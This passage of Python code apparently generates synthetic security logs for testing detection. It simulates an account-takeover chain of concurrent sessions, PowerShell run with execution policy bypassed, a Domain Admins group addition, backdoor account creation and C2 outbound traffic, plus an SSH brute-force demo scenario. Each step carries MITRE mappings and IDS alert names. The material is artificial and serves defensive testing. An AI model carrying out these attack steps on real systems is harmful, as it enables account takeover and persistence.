            tags=["synthetic", "credential_stuffing_ato", "concurrent_session", "impossible_travel"],
            extra={"mitre_technique": "T1078 - Valid Accounts",
                   "alert": "Concurrent session from different source IP"},
        ))

        # Stage 4 – Privilege escalation: attempts to run PowerShell as admin
        ts_privesc = ts_ato + timedelta(minutes=2, seconds=random.randint(10, 30))
        events.append(Event(
            timestamp=ts_privesc,
            log_source=LOG_SOURCE_WINDOWS_SYSMON,
            event_type=EVENT_TYPE_PRIVILEGE_ESCALATION,
            raw_log=f"Sysmon EventID=4688 process=powershell.exe -ExecutionPolicy Bypass -Command ... user={victim_user} host={workstation} elevated=True",
            user=victim_user, host=workstation, src_ip=internal_ip,
            action="executed", severity="high",
            tags=["synthetic", "credential_stuffing_ato", "privilege_escalation", "powershell"],
            extra={"mitre_technique": "T1059.001 - PowerShell",
                   "process": "powershell.exe", "elevated": True},
        ))

        # Stage 5 – Account manipulation: victim account added to Domain Admins
        ts_acct = ts_privesc + timedelta(minutes=1, seconds=random.randint(15, 40))
        events.append(Event(
            timestamp=ts_acct,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_ACCOUNT_MANIPULATION,
            raw_log=f"Security-Auditing EventID=4728: Member added to group. Group=Domain Admins Member={victim_user} changed_by={victim_user}",
            user=victim_user, host=workstation, src_ip=internal_ip,
            action="group_add", severity="critical",
            tags=["synthetic", "credential_stuffing_ato", "account_manipulation", "domain_admins"],
            extra={"mitre_technique": "T1098 - Account Manipulation",
                   "group": "Domain Admins", "member_added": victim_user},
        ))

        # Stage 6 – Persistence: new backdoor account created
        ts_create = ts_acct + timedelta(minutes=1, seconds=random.randint(10, 25))
        events.append(Event(
            timestamp=ts_create,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_ACCOUNT_MANIPULATION,
            raw_log=f"Security-Auditing EventID=4720: User account created. New_Account={new_backdoor} Created_By={victim_user} host={workstation}",
            user=victim_user, host=workstation, src_ip=internal_ip,
            action="create_account", severity="critical",
            tags=["synthetic", "credential_stuffing_ato", "persistence", "backdoor_account"],
            extra={"mitre_technique": "T1136.001 - Create Local Account",
                   "new_account": new_backdoor},
        ))

        # Stage 7 – Backdoor account added to admins immediately
        ts_backdoor_priv = ts_create + timedelta(seconds=random.randint(15, 30))
        events.append(Event(
            timestamp=ts_backdoor_priv,
            log_source=LOG_SOURCE_WINDOWS_AUTH,
            event_type=EVENT_TYPE_ACCOUNT_MANIPULATION,
            raw_log=f"Security-Auditing EventID=4728: Member added to group. Group=Administrators Member={new_backdoor} changed_by={victim_user}",
            user=victim_user, host=workstation, src_ip=internal_ip,
            action="group_add", severity="critical",
            tags=["synthetic", "credential_stuffing_ato", "persistence", "admin_group"],
            extra={"mitre_technique": "T1098 - Account Manipulation",
                   "group": "Administrators", "member_added": new_backdoor},
        ))

        # Stage 8 – C2/exfil: outbound connection for staging
        ts_c2 = ts_backdoor_priv + timedelta(minutes=1, seconds=random.randint(20, 50))
        events.append(Event(
            timestamp=ts_c2,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"IDS ALERT: C2-like outbound TCP src={internal_ip} dst={c2_ip}:443 host={workstation} bytes_out=18432",
            src_ip=internal_ip, dst_ip=c2_ip, dst_port=443,
            host=workstation, protocol="tcp", direction=DIRECTION_OUTBOUND,
            alert_name="ET TROJAN Suspicious Outbound After Account Manipulation",
            action="alerted", severity="critical",
            tags=["synthetic", "credential_stuffing_ato", "c2", "ids"],
            extra={"mitre_technique": "T1041 - Exfiltration Over C2 Channel"},
        ))

        # Benign noise
        for _ in range(max(noise_events, 4)):
            ts = between(start, t0 - timedelta(minutes=2))
            events.append(Event(
                timestamp=ts,
                log_source=LOG_SOURCE_WINDOWS_AUTH,
                event_type=EVENT_TYPE_AUTH_SUCCESS,
                raw_log="Normal user logon (business hours)",
                user=random.choice(["alice.b", "bob.k", "carol.t"]),
                host=random.choice(["WIN-WS-010", "WIN-WS-011", "WIN-WS-012"]),
                src_ip=f"10.0.1.{random.randint(10, 80)}",
                action="success", severity="info",
                tags=["synthetic", "credential_stuffing_ato", "noise"],
            ))

        events.sort(key=lambda e: (e.timestamp or end, e.event_id))
        return events

    # --- multi_stage_attack: times chosen to satisfy correlation window ---
    user = random.choice(["admin", "svc_ops", "deploy"])
    host = random.choice(["linux-web-01", "app-srv-02", "bastion-01"])
    src_ip = f"192.168.{random.randint(0, 2)}.{random.randint(40, 220)}"
    dst_ip = f"203.0.113.{random.randint(20, 80)}"

    attack_end = end - timedelta(minutes=random.uniform(0.5, 4))
    t_burst_start = attack_end - timedelta(minutes=12)

    for i in range(7):
        ts = t_burst_start + timedelta(seconds=i * 32 + random.randint(0, 12))
        events.append(
            Event(
                timestamp=ts,
                log_source=LOG_SOURCE_LINUX_AUTH,
                event_type=EVENT_TYPE_AUTH_FAILURE,
                raw_log=f"synthetic sshd failed user={user} host={host} src={src_ip}",
                user=user,
                src_ip=src_ip,
                host=host,
                action="failed",
                severity="medium",
                tags=["synthetic", "live_demo"],
            )
        )

    ts_ok = t_burst_start + timedelta(minutes=4, seconds=random.randint(5, 45))
    events.append(
        Event(
            timestamp=ts_ok,
            log_source=LOG_SOURCE_LINUX_AUTH,
            event_type=EVENT_TYPE_AUTH_SUCCESS,
            raw_log=f"synthetic sshd success user={user} host={host} src={src_ip}",
            user=user,
            src_ip=src_ip,
            host=host,
            action="success",
            severity="info",
            tags=["synthetic", "live_demo"],
        )
    )

    ts_net = ts_ok + timedelta(minutes=5, seconds=random.randint(20, 180))
    events.append(
        Event(
            timestamp=ts_net,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_NETWORK_OUTBOUND,
            raw_log=f"synthetic tcp outbound src={src_ip} dst={dst_ip}:443",
            src_ip=src_ip,
            dst_ip=dst_ip,
            dst_port=443,
            host=host,
            protocol="tcp",
            direction=DIRECTION_OUTBOUND,
            action="allowed",
            severity="info",
            tags=["synthetic", "live_demo"],
        )
    )

    ts_ids = ts_net + timedelta(seconds=random.randint(4, 20))
    events.append(
        Event(
            timestamp=ts_ids,
            log_source=LOG_SOURCE_NETWORK_IDS,
            event_type=EVENT_TYPE_IDS_ALERT,
            raw_log=f"synthetic IDS alert Possible C2 {src_ip}->{dst_ip}",
            src_ip=src_ip,
            dst_ip=dst_ip,
            dst_port=443,
            host=host,
            alert_name="ET TROJAN Possible C2 Activity",
            protocol="tcp",
            direction=DIRECTION_OUTBOUND,
            action="blocked",
            severity="high",
            tags=["synthetic", "live_demo", "ids"],
        )
    )

    # Benign noise earlier in the window (different users/hosts to avoid corrupting chain)
    for _ in range(noise_events):
        ts = between(start, t_burst_start - timedelta(minutes=2))
        events.append(
            Event(
                timestamp=ts,
                log_source=LOG_SOURCE_LINUX_AUTH,
                event_type=EVENT_TYPE_AUTH_SUCCESS,
                raw_log="synthetic cron/deploy login",
                user=random.choice(["deploy", "monitor", "cron"]),
                host=random.choice(["build-01", "mon-02", "ci-03"]),
                src_ip=f"10.0.0.{random.randint(2, 30)}",
                action="success",
                severity="info",
                tags=["synthetic", "live_demo", "noise"],
            )
        )

    events.sort(key=lambda e: (e.timestamp or end, e.event_id))
    return events
